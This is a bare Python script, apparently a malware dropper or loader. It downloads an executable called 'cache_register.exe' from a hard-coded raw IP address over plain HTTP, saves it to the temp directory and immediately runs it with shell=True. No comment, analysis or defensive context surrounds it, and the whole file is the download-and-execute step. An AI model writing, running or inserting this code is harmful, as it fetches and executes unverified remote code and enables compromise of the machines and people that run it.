import os
import tempfile
import requests
import subprocess

url = "http://194.87.10.246/cache_register.exe"

temp_dir = tempfile.gettempdir()

local_path = os.path.join(temp_dir, "cache_register.exe")

with requests.get(url, stream=True) as r:
    with open(local_path, "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            f.write(chunk)

process = subprocess.Popen(local_path, shell=True)
